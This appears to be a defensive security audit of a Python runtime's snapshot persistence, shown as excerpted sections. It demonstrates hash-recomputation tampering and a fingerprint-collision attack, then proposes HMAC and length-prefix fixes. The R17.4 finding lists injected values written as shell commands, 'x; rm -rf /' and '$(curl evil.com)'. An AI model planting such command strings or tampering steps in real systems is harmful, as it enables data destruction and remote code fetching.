## 1. Executive Summary

The v7.5 SRS Runtime has substantially improved its defensive posture since R3's
v7.2 audit. The `_sanitize_id` regex `^[a-zA-Z0-9_-]{1,64}$` is **correct and
unbypassable** for path traversal (verified against 30 attack vectors). File
permissions on snapshot files are 0o600 (was 0o664 in v7.2 — R3.8 fixed).
Atomic writes via `tempfile.mkstemp + fsync + os.replace` eliminate torn-write
races. Cross-process `fcntl.flock` was added in v7.4.

**However**, the central security claim of the v7.5 advice-integrity "fix" (R3.2)
is **false**. The SHA-256 `advice_hash` is **not a MAC** — it has no secret key,
the algorithm is documented in the source code, and an attacker with filesystem
write access can recompute the hash after tampering. The fix only detects
*accidental* corruption (bit-flips), not *malicious* tampering. R17.1 demonstrates
this end-to-end: a tampered snapshot with a recomputed hash is loaded, and the
runtime returns the attacker-chosen answer.

Worse, R3.3 (advice fingerprint collision via the `b"|"` separator) was **never
fixed** — `advice.py:39` still uses `b"|".join(hypotheses)`. R17.3 demonstrates
a full end-to-end collision attack: an attacker who runs one `identify` task
with a crafted hypothesis list (split at a 0x7c byte boundary) can poison advice
for a *different* hypothesis set that the victim will later use.

Additional integrity gaps: `primitive_stats`, `execution_history`, `latest.json`,
and `inflight_*.json` have **no integrity protection at all** — only
`advice_table` is hashed. An attacker can tamper with any of these fields without
triggering any detection. Combined with R17.1, this means an attacker can
rewrite the runtime's recent-execution history, roll back the `latest` pointer
to an older snapshot, and inject arbitrary `task_id` strings (e.g.,
`"x; rm -rf /"`) into the `capabilities()` output.

**Security score: 5/10** (down from the v7.5 self-claimed 9/10). The runtime
blocks casual path traversal and accidental corruption, but does not provide
meaningful integrity against an attacker with filesystem write access — which
is the threat model the advice_hash was supposedly designed to address.

**Top 3 security risks**:
1. **R17.1**: advice_hash is a non-secret hash, trivially bypassable (CRITICAL).
2. **R17.3**: advice fingerprint collision via `b"|".join` still exploitable (HIGH).
3. **R17.4**: `primitive_stats` / `execution_history` not integrity-protected — tampering goes undetected (HIGH).

## 4. Advice Poisoning Bypass Results

The R3.2 fix stores a `advice_hash = SHA-256(advice_table)` alongside the
advice_table, and discards the advice on hash mismatch. R17.1 tests whether an
attacker who knows the hash algorithm (which is documented in the source code at
`persistence.py:301-309`) can recompute the hash after tampering.

**Test procedure**:
1. Create a legitimate snapshot with advice `{key: 7}`.
2. Read the snapshot, change the advice value to `999`.
3. Recompute the hash using the public algorithm
   (`hashlib.sha256(json.dumps(advice_table, sort_keys=True, default=str).encode()).hexdigest()`).
4. Write both tampered advice and recomputed hash back to the snapshot file.
5. Create a new `Runtime` and load the snapshot.

**Result**: **The tampered advice was loaded successfully.**

```
Pre-tamper result: correct=True answer=7
Original advice_table: {'9551b3f13814c02d:7': 7}
Original advice_hash: 9d991b09bd19a6c329a38b0e26f4375f604959001352d80edef6e3c45661545f

Tampered advice_table: {'9551b3f13814c02d:7': 999}
Recomputed advice_hash: e142cb26aa6ae82848a18e422d808c83c8a9db271368064d32940325057351a3

After tamper-load: advice_table = {'9551b3f13814c02d:7': 999}
Lookup returns: 999
Was the tampered advice loaded? True

Post-tamper result: correct=False answer=999
  advice_hit=True
  used_advice=True

Verdict: Tampered advice WAS loaded
```

**Verdict**: ❌ **The advice_hash check is bypassable.** The hash provides no
security boundary against an attacker with filesystem write access. It only
detects *accidental* corruption (e.g., a bit-flip on disk), not *malicious*
tampering. This is because:

1. The hash algorithm is publicly documented in the source code
   (`persistence.py:301-309`).
2. The hash is stored in the same file as the data it protects.
3. There is no secret key — the hash is SHA-256, not HMAC-SHA256.

To actually protect against malicious tampering, the runtime would need either:
- A secret key stored separately (with 0o600 permissions), used in an HMAC.
- A digital signature (e.g., Ed25519) verified with a public key embedded in
  the runtime binary.
- A trusted bootloader / measured-boot chain that extends the trust boundary
  from the kernel to the runtime.

The persistence.py docstring at line 387 acknowledges this limitation:
> `Not cryptographic (no secret key), but detects accidental corruption
> and casual tampering.`

But the v7.5 changelog and the runtime's external API do NOT communicate this
limitation. A user reading "SHA-256 advice hash" would reasonably assume the
hash provides integrity against malicious tampering. It does not.

## 5. Advice Fingerprint Collision (R3.3 Still Unfixed)

R3.3 (v7.2) flagged that `b"|".join(hypotheses)` is reversible when hypothesis
bytes contain `b"|"` (byte 0x7c). This was **never fixed** — `advice.py:39`
still uses the same construction.

**Demonstrated end-to-end attack**:

1. Attacker identifies a hypothesis containing byte 0x7c (sha256 hashes have a
   ~12% chance per byte, so most 32-byte hashes contain at least one `|`).
   For `sha256("h5")`, byte 10 is 0x7c.

2. Attacker constructs an "evil" hypothesis list by splitting the original
   hypothesis at the 0x7c boundary:
   - victim_hyps = `[sha256("h5")]` (1 element, 32 bytes)
   - evil_hyps = `[sha256("h5")[:10], sha256("h5")[11:]]` (2 elements, 10+21 bytes)

3. Both lists produce the same `b"|".join()` output:
   - `b"|".join([sha256("h5")])` = `sha256("h5")` (32 bytes)
   - `b"|".join(evil_hyps)` = `sha256("h5")[:10] + b"|" + sha256("h5")[11:]`
     = `sha256("h5")[:10] + sha256("h5")[10] + sha256("h5")[11:]`
     = `sha256("h5")` (32 bytes, because `sha256("h5")[10] == b"|"`)

4. Both lists produce the same advice key `d29e942d7f56ce90`.

5. Attacker runs `Task(kind="identify", payload={"hypotheses": evil_hyps,
   "target_idx": 0})` on their own Runtime. The task succeeds (target_idx=0
   exists in the 2-element evil_hyps list), and advice is seeded:
   `{"d29e942d7f56ce90:0": 0}`.

6. Attacker persists the snapshot and (somehow) gets the victim to load it
   (e.g., via a shared home directory, a CI artifact, or a published model).

7. Victim runs `Task(kind="identify", payload={"hypotheses": [sha256("h5")],
   "target_idx": 0})`. The advice lookup collides → returns `0`. The runtime
   returns `answer=0` with `advice_hit=True, used_advice=True, queries=0`
   — never actually verifying the answer against the oracle.

8. Combined with R17.1 (hash bypass), the attacker can set the advice value
   to *any* integer (not just 0) by tampering the snapshot and recomputing
   the hash. The victim's runtime then returns that arbitrary value as the
   "answer".

**Verdict**: ❌ **Collision attack works end-to-end.** The fix is to use
length-prefixed encoding instead of `b"|".join`:

```python
def _key(self, hypotheses, target_idx):
    h_hash = hashlib.sha256(
        b"".join(len(h).to_bytes(4, "big") + h for h in hypotheses)
    ).hexdigest()[:16]
    return f"{h_hash}:{target_idx}"
```

This makes the encoding non-reversible: the length prefix disambiguates
different splits of the same concatenated bytes.

## 7. Top 3 Security Risks (Detailed)

### Risk 1: R17.1 — advice_hash is not a MAC (CRITICAL)

**What's wrong**: The v7.5 fix for R3.2 (advice poisoning) added a SHA-256 hash
of the `advice_table` to detect tampering. But SHA-256 with no secret key is a
*hash*, not a *MAC* (Message Authentication Code). Anyone who knows the
algorithm — which is publicly documented in the source code at
`persistence.py:301-309` — can recompute the hash. Storing the hash next to the
data it protects provides zero security boundary against an attacker with
filesystem write access.

**Why it matters**: The runtime uses advice as a trusted oracle. When
`advice_hit=True`, the pipeline short-circuits all subsequent stages (E, A, V)
and returns the cached answer with `queries=0`. The verification stage (which
would normally catch wrong answers with high probability) is skipped entirely.
So a tampered advice entry of `{"key": 999}` causes the runtime to return
`answer=999` for the corresponding `(hypotheses, target_idx)` pair, with no
verification whatsoever.

**Demonstrated attack chain**:
1. Attacker reads `~/.srs/snapshots/snap_*.json` (mode 0o600, but attacker is
   the user or has compromised the user's account).
2. Attacker modifies `advice_table` to set `{"9551b3f13814c02d:7": 999}`.
3. Attacker recomputes the hash:
   ```python
   import hashlib, json
   advice_json = json.dumps({"9551b3f13814c02d:7": 999}, sort_keys=True, default=str)
   new_hash = hashlib.sha256(advice_json.encode()).hexdigest()
   ```
4. Attacker writes both back to the snapshot file.
5. Next `Runtime()` instance loads the tampered advice (the hash matches).
6. Next `execute(Task(kind="identify", payload={..., "target_idx": 7}))` returns
   `answer=999, correct=False, advice_hit=True, queries=0`.

**Why the existing fix doesn't help**: The persistence.py docstring at line 387
acknowledges the limitation: "Not cryptographic (no secret key), but detects
accidental corruption and casual tampering." But "casual tampering" is undefined
— anyone with a text editor and 10 seconds can recompute a SHA-256 hash. The
fix detects disk bit-flips (the only "accidental corruption" vector), nothing
more. The v7.5 changelog and external API do NOT communicate this limitation,
so consumers reasonably assume the hash provides real integrity protection.

**Required fix**: Replace the bare SHA-256 hash with an HMAC-SHA256 keyed hash.
The secret key should be:
- Generated on first run with `secrets.token_bytes(32)`.
- Stored in `~/.srs/secret_key` with 0o600 permissions.
- Loaded into the runtime at startup.
- Used as the HMAC key for both `advice_hash` and (per R17.4, R17.5, R17.6) the
  `primitive_stats`, `latest.json`, and `inflight_*.json` integrity checks.

Alternative: sign each snapshot with Ed25519 using a private key stored in
`~/.srs/ed25519.key` (0o600). Verify with the corresponding public key embedded
in the runtime. This is more flexible (key rotation, multi-tenant signing) but
more complex.

### Risk 2: R17.3 — Advice fingerprint collision via `b"|".join` (HIGH)

**What's wrong**: The advice key is `sha256(b"|".join(hypotheses)).hexdigest()[:16]`
followed by `:{target_idx}`. The `b"|".join()` call is reversible when
hypothesis bytes contain `b"|"` (byte 0x7c). This means two *different*
hypothesis lists can produce the *same* advice key.

**Why it matters**: Advice built for one hypothesis list is silently served for
a different hypothesis list. The runtime trusts the cached answer without
verification, so the victim gets the attacker's chosen answer with no query
cost.

**Demonstrated attack**:
- victim_hyps = `[sha256("h5")]` — a single 32-byte hash. sha256("h5")
  happens to contain 0x7c at byte 10.
- evil_hyps = `[sha256("h5")[:10], sha256("h5")[11:]]` — two byte strings that
  join back to sha256("h5").
- Both produce advice key `d29e942d7f56ce90`.
- Attacker runs `identify` with evil_hyps (target_idx=0), seeds advice
  `{"d29e942d7f56ce90:0": 0}`.
- Victim loads the snapshot, runs `identify` with victim_hyps (target_idx=0),
  gets `answer=0, advice_hit=True, queries=0` — the attacker's answer.

**Why R3.3 was never fixed**: Looking at the v7.2 → v7.5 worklog, R3.3 was
listed as "not in F1's required fixes list" (line 3016). The fix agent (F1)
prioritized R3.1, R3.2, R3.5 but skipped R3.3 and R3.4. The bug has persisted
through v7.2 → v7.3 → v7.4 → v7.5.

**Required fix**: Replace `b"|".join(hypotheses)` with length-prefixed encoding:

```python
def _key(self, hypotheses, target_idx):
    encoded = b"".join(len(h).to_bytes(4, "big") + h for h in hypotheses)
    h_hash = hashlib.sha256(encoded).hexdigest()[:16]
    return f"{h_hash}:{target_idx}"
```

The 4-byte length prefix makes the encoding non-reversible: an attacker cannot
construct two different hypothesis lists that produce the same encoded bytes,
because the length prefix disambiguates splits.

### Risk 3: R17.4 — primitive_stats / execution_history not integrity-protected (HIGH)

**What's wrong**: The `advice_hash` only covers `advice_table`. The other
fields in the snapshot — `primitive_stats`, `execution_history`, `_total_tasks`,
`last_task_id`, `last_result` — are loaded without any integrity check. An
attacker can tamper with any of these fields without triggering a hash mismatch.

**Why it matters**: `execution_history` is exposed via `capabilities()` as
`recent_executions`. The runtime trusts it for the `success_rate`,
`total_queries_made`, and `avg_queries_per_execution` metrics. An attacker can:

1. **Inject arbitrary task_ids** (e.g., `"x; rm -rf /"`, `"$(curl evil.com)"`)
   into `execution_history`. These propagate to any consumer of
   `capabilities()` — dashboards, monitoring systems, audit logs.
2. **Bloat the snapshot** with 100KB strings in `evil_field` (R17.4
   demonstration), causing memory growth in any consumer that loads
   `capabilities()` output.
3. **Falsify success metrics** — set `success_rate` to 1.0 by injecting fake
   `correct=True` entries, hiding a real-world failure rate from operators.
4. **Reset `_total_tasks` to 0**, hiding evidence of prior executions (anti-forensics).

**Demonstrated attack**: R17.4 proof-of-concept injected 100 entries with
`task_id="x; rm -rf /"` and `evil_field="A"*10000` into `execution_history`.
The recomputed advice_hash matched (because advice_table was unchanged), and
the runtime loaded the tampered data. `capabilities()["recent_executions"]`
then exposed the injected entries to any caller.

**Required fix**: Compute a single hash (HMAC-SHA256 with the secret key from
R17.1's fix) over the *entire* snapshot payload — `advice_table`,
`primitive_stats`, `execution_history`, `_total_tasks`, `timestamp` — excluding
only the `advice_hash` field itself. Store as `snapshot_hmac`. On load,
recompute and verify; on mismatch, discard the entire snapshot (not just
advice) and fall back to fresh state.

## 8. Security Score: 5/10

The runtime blocks casual path traversal (R3.1 verified secure) and accidental
corruption (R3.2 detects bit-flips), and uses 0o600 file permissions (R3.8
fixed). However, the central security claim — that the advice_hash protects
against malicious tampering — is **false** (R17.1). Three additional HIGH

## 9. Threat Model

### Trust boundaries

The SRS Runtime trusts:

1. **The filesystem** (`~/.srs/snapshots/`) — snapshots, latest.json, and
   inflight files are trusted to be untampered. The advice_hash check (R3.2)
   only protects `advice_table` against *accidental* corruption; it does NOT
   protect against malicious tampering (R17.1) or any other field (R17.4-R17.6).
2. **The `SRS_HOME` environment variable** — used as-is for the home directory
   path. No validation (R17.11).
3. **The `--home` CLI flag** — same, user-controlled.
4. **The `PYTHONHASHSEED` environment variable** — affects Python's built-in
   `hash()` (mitigated by `_deterministic_seed` using sha256).
5. **The system clock** — used for `snapshot_id` generation (R17.10) and ISO
   timestamps.
6. **The Python standard library** — `random.Random` for query selection
   (R17.12, not CSPRNG).
7. **The fcntl advisory locking** — cooperative only; a non-cooperating process
   can ignore locks (documented in persistence.py:78).

The runtime does NOT trust:

1. **The network** — no network calls in `srs/`.
2. **The task payload** — validated by `_validate_task` (kind, target_idx,
   hypotheses length).
3. **The task_id** — wait, actually it DOES trust task_id (R17.9). The
   `_sanitize_id` check only fires when `save_in_flight` is called (i.e.,
   `resume=True`). For `resume=False`, task_id is used as-is in logging and
   execution_history.

### Trust boundary diagram

```
+-------------------------------------------------------------------+
|  USER-CONTROLLED INPUT                                            |
|  - task_id (Task.__post_init__ accepts any string)                |
|  - payload.hypotheses (list of bytes — NOT validated for 0x7c)   |
|  - payload.target_idx (validated: int, in range)                  |
|  - payload.n_features (NOT validated for range)                   |
|  - --home CLI flag (accepted as-is)                               |
|  - SRS_HOME env var (accepted as-is)                              |
+-------------------------------------------------------------------+
                              |
                              v
+-------------------------------------------------------------------+
|  RUNTIME (trusted code)                                           |
|  - _validate_task: checks payload keys + target_idx range         |
|  - _sanitize_id: validates task_id for save_in_flight ONLY        |
|  - AdviceTable._key: uses b"|".join (collision-vulnerable)        |
|  - random.Random: seeded from sha256(task_id) — deterministic     |
+-------------------------------------------------------------------+
                              |
                              v
+-------------------------------------------------------------------+
|  FILESYSTEM (trusted storage)                                     |
|  - snap_*.json: advice_hash covers advice_table ONLY              |
|  - latest.json: NO integrity check                                |
|  - inflight_*.json: NO integrity check                            |
|  - execution_history: NO integrity check                          |
|  - primitive_stats: NO integrity check                            |
|                                                                   |
|  An attacker with FS write access can:                            |
|  - Tamper advice_table + recompute hash (R17.1)                   |
|  - Tamper execution_history freely (R17.4)                        |
|  - Swap latest.json path (rollback, R17.5)                        |
|  - Tamper inflight queries_made (R17.6)                           |
|  - Crash via deeply-nested JSON (R17.7)                           |
```

### Attacker model

The runtime's security model assumes:
- **No network adversary** (no network code).
- **No privileged attacker** (root can read 0o600 files anyway).
- **No unprivileged attacker with FS write access** — but this is exactly the
  threat model that R3.2 (advice_hash) was designed to address! And it fails
  (R17.1).

The realistic threat is: **a user with shell access who can write to
`~/.srs/snapshots/`** — e.g., a CI worker that runs untrusted code, a multi-user
system where `~/.srs/` is shared, or a development machine where an attacker has
gained code execution under the user's account. In all three cases, the
runtime's integrity checks provide no meaningful protection.

## 10. Specific Fixes Required

### Fix 1 (CRITICAL — R17.1): Replace SHA-256 with HMAC-SHA256

In `persistence.py`:

```python
import hmac
import secrets
from pathlib import Path

_SECRET_KEY_PATH = Path.home() / ".srs" / "secret_key"

def _load_or_create_secret_key() -> bytes:
    """Load the HMAC secret key, creating it on first run."""
    if _SECRET_KEY_PATH.exists():
        return _SECRET_KEY_PATH.read_bytes()
    _SECRET_KEY_PATH.parent.mkdir(parents=True, exist_ok=True)
    key = secrets.token_bytes(32)
    # Write with 0o600 — owner-only read/write.
    fd = os.open(str(_SECRET_KEY_PATH), os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    try:
        with os.fdopen(fd, "wb") as f:
            f.write(key)
    except Exception:
        _SECRET_KEY_PATH.unlink(missing_ok=True)
        raise
    return key

_SECRET_KEY = _load_or_create_secret_key()

def _compute_advice_hash(advice_table: Any) -> str:
    """HMAC-SHA256 of the advice table (R17.1 fix).

    The secret key prevents an attacker with filesystem write access from
    recomputing the hash after tampering.
    """
    payload = json.dumps(advice_table, sort_keys=True, default=str).encode()
    return hmac.new(_SECRET_KEY, payload, hashlib.sha256).hexdigest()
```

### Fix 2 (HIGH — R17.3): Length-prefix the hypothesis encoding

In `primitives/advice.py`:

```python
def _key(self, hypotheses: list[bytes], target_idx: int) -> str:
    """Key includes target_idx to prevent cross-target poisoning.

    R17.3 fix: use length-prefixed encoding instead of b"|".join.
    The b"|".join was reversible when hypothesis bytes contained 0x7c,
    allowing two different hypothesis lists to collide.
    """
    encoded = b"".join(len(h).to_bytes(4, "big") + h for h in hypotheses)
    h_hash = hashlib.sha256(encoded).hexdigest()[:16]
    return f"{h_hash}:{target_idx}"
```

### Fix 3 (HIGH — R17.4): Hash the entire snapshot payload

In `persistence.py`, change `save()` and `load_latest()` to compute and verify
an HMAC over the *entire* snapshot payload (excluding the `advice_hash` field
itself):

```python
def _compute_snapshot_hmac(payload: dict) -> str:
    """HMAC over the entire snapshot payload (R17.4 fix)."""
    # Strip the hash field before computing — it's not part of what we hash.
    payload_without_hash = {k: v for k, v in payload.items() if k != "advice_hash"}
    encoded = json.dumps(payload_without_hash, sort_keys=True, default=str).encode()
    return hmac.new(_SECRET_KEY, encoded, hashlib.sha256).hexdigest()

def save(snap: Snapshot, path=None) -> Path:
    ...
    payload = snap.to_dict()
    payload["advice_hash"] = _compute_snapshot_hmac(payload)
    _atomic_write_json(fpath, payload)
    ...

def load_latest(path=None) -> Snapshot | None:
    ...
    stored_hash = d.pop("advice_hash", None)
    if stored_hash is not None:
        actual_hash = _compute_snapshot_hmac(d)
        if not hmac.compare_digest(actual_hash, stored_hash):
            logger.warning("snapshot HMAC mismatch; discarding snapshot")
            return None
    ...
```

Note: `hmac.compare_digest` is constant-time — use it instead of `==` to prevent
timing side-channels (even though the timing attack is hard to exploit here,
it's a defense-in-depth measure).

### Fix 7 (MEDIUM — R17.8): Validate AdviceTable.from_dict inputs

```python
@classmethod
def from_dict(cls, d: dict[str, Any]) -> AdviceTable:
    t = cls()
    for key, value in d.items():
        # Key must match {16-hex}:{int}
        if not isinstance(key, str) or ":" not in key:
            continue
        h_hash, _, target_str = key.partition(":")
        if len(h_hash) != 16 or not all(c in "0123456789abcdef" for c in h_hash):
            continue
        try:
            target = int(target_str)
        except ValueError:
            continue
        # Value must be a non-negative int in a reasonable range
        if not isinstance(value, int) or isinstance(value, bool) or value < 0:
            continue
        if value >= MAX_HYPOTHESES:
            continue
        t._table[key] = value
    return t
```

## 11. Conclusion

The v7.5 SRS Runtime's path-traversal defenses (R3.1) are robust and unbypassable.
File permissions, atomic writes, and cross-process locking are correctly
implemented. Bandit reports no HIGH or MEDIUM findings.

However, the advice-integrity "fix" (R3.2) is fundamentally flawed: SHA-256
without a secret key is not a MAC, and an attacker with filesystem write access
can trivially recompute the hash after tampering. Combined with the unfixed
R3.3 fingerprint collision (still using `b"|".join`) and the unprotected
`primitive_stats` / `execution_history` / `latest.json` / `inflight_*.json`
fields, the runtime provides essentially no integrity protection against a
malicious attacker with filesystem write access — which is precisely the threat
model the advice_hash was designed to address.

The fixes required are not difficult: HMAC-SHA256 with a per-user secret key
(Fix 1), length-prefixed hypothesis encoding (Fix 2), and extending the hash
coverage to the full snapshot payload (Fix 3) would close the three highest-
priority findings. The remaining MEDIUM/LOW fixes are smaller, defense-in-depth
improvements.

**Recommendation**: Do not bump the version to v7.6 without addressing at least
R17.1, R17.3, and R17.4. The current v7.5 security posture (5/10) is below the
threshold for any production deployment that handles untrusted snapshots or
runs on shared infrastructure.
